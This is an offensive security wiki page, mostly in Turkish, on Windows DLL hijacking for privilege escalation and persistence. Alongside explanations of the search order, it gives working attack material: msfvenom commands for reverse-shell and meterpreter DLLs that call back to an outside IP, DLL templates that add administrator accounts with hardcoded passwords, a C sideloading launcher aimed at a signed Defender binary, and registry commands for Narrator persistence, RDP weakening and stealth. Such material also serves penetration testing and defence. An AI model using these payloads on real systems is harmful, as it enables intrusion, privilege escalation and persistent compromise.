# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az sıklıkla yetki yükseltme için kullanılır. Buradaki odak yükseltme olsa da, hijacking yöntemi hedefler arasında tutarlıdır.

### Yaygın Teknikler

Bir uygulamanın DLL yükleme stratejisine bağlı olarak etkinliği değişen birkaç yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tane ile değiştirmek; isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanılabilir.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru DLL'den önce aranacak bir arama yoluna yerleştirerek uygulamanın arama modelinden faydalanma.
3. **Phantom DLL Hijacking**: Uygulamanın yüklemesi için, var olmayan bir bağımlı DLL olduğunu düşünerek kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'in yerine kötü amaçlı bir muadil koyma; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Relative Path DLL Hijacking**: Kopyalanmış uygulama ile birlikte kullanıcı kontrolündeki bir dizine kötü amaçlı DLL koyma; Binary Proxy Execution tekniklerine benzer.

## Eksik DLL'leri Bulma

Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Eğer **genel olarak eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.\
Eğer belirli bir **çalıştırılabilir dosya içinde eksik bir DLL** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, programı çalıştırın ve olay yakalamayı durdurun.

## Eksik DLL'leri Sömürme

Yetki yükseltmek için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir DLL'i, o DLL'in aranacağı yerlerden birine **yazabilmektir**. Bu nedenle ya **DLL'in orijinal DLL'in bulunduğu klasörden önce aranacağı** bir klasöre bir DLL yazabileceğiz (garip bir durum), ya da DLL'in aranacağı bir klasöre yazabileceğiz ve orijinal **DLL hiçbir klasörde mevcut olmayacak**.

### DLL Arama Sırası

**Microsoft documentation** içinde DLL'lerin nasıl yüklendiğini özellikle bulabilirsiniz.

Windows uygulamaları, DLL'leri önceden tanımlanmış bir dizi arama yolunu takip ederek ve belirli bir sıraya uyarak arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirildiği ve böylece orijinal DLL'den önce yüklendiği durumlarda ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda 32-bit sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu veren bir fonksiyon yoktur, ancak bu dizin aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH environment variable içinde listelenen dizinler. Bunun, **App Paths** kayıt anahtarında belirtilen uygulama başına yolunu içermediğini unutmayın. **App Paths** anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda varsayılan arama sırasıdır. Bu özellik devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, bir DLL'in yalnızca adını belirtmek yerine mutlak yol gösterilerek yüklendiğini unutmayın. Bu durumda o DLL **yalnızca o yolda** aranır (DLL'in herhangi bir bağımlılığı varsa, onlar ad ile yüklendiği gibi aranacaktır).

Arama sırasını değiştirmek için başka yollar da vardır ancak bunları burada açıklamayacağım.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Yeni oluşturulan bir sürecin DLL arama yolunu belirleyici bir şekilde etkilemenin ileri düzey bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrolündeki bir dizin sağlanarak, bir hedef süreç isimle ithal edilmiş bir DLL'i çözümlüyorsa (mutlak yol yok ve güvenli yükleme bayrakları kullanılmıyorsa), bu süreç kötü amaçlı DLL'i o dizinden yüklemeye zorlanabilir.

Ana fikir
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrolünüzdeki klasöre işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i isimle çözdüğünde, loader çözümleme sırasında sağlanan bu DllPath'i dikkate alacak ve kötü amaçlı DLL hedef EXE ile aynı yerde olmasa bile güvenilir sideloading mümkün olacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca mevcut süreci etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL'i isimle import etmeli veya LoadLibrary ile yüklemelidir (mutlak yol yok ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmıyor).
- KnownDLLs ve sert kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata işlemi):

<details>
<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı xmllite.dll (gerekli fonksiyonları dışa aktaran veya gerçek olan ile proxy yapan) dosyasını DllPath dizininize koyun.
- Yukarıdaki teknikle isimle xmllite.dll aradığı bilinen imzalı bir binary'i başlatın. Loader importu sağlanan DllPath üzerinden çözerek DLL'inizi sideload eder.

Bu teknik, gerçek ortamda çok aşamalı sideloading zincirlerini tetiklemek için gözlemlenmiştir: başlangıçtaki bir launcher bir helper DLL bırakır; bu DLL daha sonra, saldırganın DLL'inin staging dizininden yüklenmesini zorlamak için özel bir DllPath ile Microsoft-imzalı, hijackable bir binary spawn eder.


#### Exceptions on dll search order from Windows docs

Windows dokümanlarında standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bir **adı, bellekte zaten yüklü olan bir DLL ile aynı olan DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine, varsayılan olarak bellekteki DLL'e dönmeden önce yönlendirme ve bir manifest kontrolü gerçekleştirir. **Bu senaryoda sistem DLL için arama yapmaz**.
- DLL, geçerli Windows sürümü için bir **known DLL** olarak tanındığında, sistem o bilinen DLL'in kendi sürümünü ve bağlı olduğu diğer DLL'leri kullanır; **arama sürecini atlar**. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu bilinen DLL'lerin listesini tutar.
- Eğer bir **DLL'in bağımlılıkları** varsa, bu bağımlı DLL'ler için yapılan arama, ilk DLL tam yol ile tanımlanmış olsa bile, sanki yalnızca **modül adları** ile belirtilmişler gibi yürütülür.

### Ayrıcalık Yükseltme

**Gereksinimler**:

- Farklı **ayrıcalıklar** altında çalışan veya çalışacak (horizontal veya lateral movement) ve **bir DLL'den yoksun** olan bir süreci tespit edin.
- **DLL'in aranacağı** herhangi bir **dizin** için **write access** (yazma erişimi) sağlandığından emin olun. Bu konum yürütülebilir dosyanın dizini veya sistem path'i içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü varsayılan olarak **ayrıcalıklı bir yürütülebilirin bir dll eksik olması tuhaftır** ve bir sistem path klasöründe yazma izinlerinin olması **daha da tuhaftır** (varsayılan olarak bunu yapamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
Şanslıysanız ve gereksinimleri karşıladığınızı görürseniz, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana hedefi UAC'i bypass etmek** olsa bile, orada kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking bulabilirsiniz (muhtemelen sadece yazma izinleriniz olan klasörün yolunu değiştirerek).

Not that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'unu ve bir dll'in exports'unu şu şekilde kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dir.

### Örnek

Eğer exploitlenebilir bir senaryo bulursanız, bunu başarıyla suistimal etmenin en önemli adımlarından biri, çalıştırılacak programın ondan import edeceği en az tüm fonksiyonları export eden bir dll oluşturmaktır. Bununla birlikte, Dll Hijacking'in [Medium Integrity seviyesinden High'a **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system) yükselmek için elverişli olduğunu unutmayın. Geçerli bir dll nasıl oluşturulur örneğini, execution amaçlı dll hijacking'e odaklanan bu dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, **bir sonraki bölümde** şablon olarak kullanılabilecek veya zorunlu olmayan fonksiyonları export eden bir **dll** oluşturmak için faydalı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **zararlı kodunuzu çalıştırabilen** fakat aynı zamanda beklendiği gibi çalışması için **tüm çağrıları gerçek kütüphaneye ileten** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçları ile aslında **bir executable belirleyip proxify etmek istediğiniz kütüphaneyi seçebilir** ve **proxified bir dll üretebilir** ya da **Dll'i belirleyip** **proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) alın:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Dikkat: Bazı durumlarda derlediğiniz Dll, victim process tarafından yüklenecek olan **export several functions**'ı içermelidir; bu fonksiyonlar mevcut değilse **binary won't be able to load** ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL kullanıcı oluşturma örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı giriş noktası olan alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta öngörülebilir, dil-özel bir yerelleştirme DLL'ini aramaya devam eder; bu DLL ele geçirilerek rastgele kod yürütme ve kalıcılık sağlanabilir.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yüklenme denemesini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Normal bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcı bağlamında sabah 09:30'da çalışmasını bekleyin.
3. Görev çalışırken bir yönetici oturumu açıksa, kötü amaçlı DLL yönetici oturumunda medium integrity ile çalışır.
4. medium integrity'den SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri, MSI tabanlı droperları sıklıkla DLL side-loading ile eşleştirerek payload'ları güvenilir, imzalı bir süreç altında çalıştırır.

Chain overview
- Kullanıcı MSI indirir. GUI kurulum sırasında arka planda sessizce bir CustomAction çalışır (ör. LaunchApplication veya bir VBScript action) ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper, aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-imzalı wsc_proxy.exe + saldırgan-kontrollü wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası ilk olarak çalışma dizininden wsc.dll yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Executable veya VBScript çalıştıran girdileri arayın. Şüpheli örnek desen: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki embedded/split payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ya da lessmsi kullanın: lessmsi x package.msi C:\out
- VBScript CustomAction tarafından birleştirilip şifresi çözülen birden fazla küçük parçaya bakın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Pratik sideloading wsc_proxy.exe ile
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru imzalı host (Avast). Süreç, dizininden wsc.dll'i adıyla yüklemeye çalışır.
- wsc.dll: attacker DLL. Eğer belirli exports gerekliyse değilse, DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturup gerekli exports'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, bir proxying framework (ör. DLLirant/Spartacus) kullanarak payload'unuzu da çalıştıran bir forwarding DLL oluşturun.

- Bu teknik host binary tarafından yapılan DLL isim çözümlemesine dayanır. Eğer host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS, ve forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
